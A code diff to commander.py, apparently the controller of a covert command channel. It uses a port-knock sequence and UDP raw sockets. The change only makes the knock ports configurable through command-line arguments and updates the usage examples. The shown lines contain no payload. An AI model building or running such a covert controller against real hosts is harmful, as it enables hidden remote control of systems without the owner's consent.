@@ -53,12 +53,12 @@ class Commander:
     2. Sends commands via UDP raw socket covert channel
     """
 
-    def __init__(self, target_host):
+    def __init__(self, target_host, knock_sequence=None):
         # Resolve localhost before storing
         if target_host == "localhost":
             target_host = "127.0.0.1"
         self.target_host = target_host
-        self.knock_ports = KNOCK_SEQUENCE
+        self.knock_ports = knock_sequence or KNOCK_SEQUENCE
         self.command_port = COMMAND_PORT
         self.source_ip = self.get_local_ip()
         self.protocol = RawSocketProtocol()
@@ -550,19 +550,30 @@ def main():
     print()
 
     if len(sys.argv) < 2:
-        print("Usage: sudo python3 commander.py <target_host>")
-        print("\nExample:")
+        print("Usage: sudo python3 commander.py <target_host> [knock_port1 knock_port2 knock_port3]")
+        print("\nExamples:")
         print("  sudo python3 commander.py 192.168.1.100")
+        print("  sudo python3 commander.py 192.168.1.100 1111 2222 3333")
         sys.exit(1)
 
-    commander = Commander(sys.argv[1])
+    target_host = sys.argv[1]
+
+    if len(sys.argv) >= 5:
+        try:
+            knock_sequence = [int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])]
+        except ValueError:
+            print("[!] Knock ports must be integers")
+            sys.exit(1)
+    else:
+        knock_sequence = KNOCK_SEQUENCE  # default [7000, 8000, 9000]
+
+    commander = Commander(target_host, knock_sequence)
 
     try:
         commander.interactive_session()
     except Exception as e:
         print(f"\n[!] Fatal error: {e}")
         sys.exit(1)
-
 
 if __name__ == "__main__":
     main()
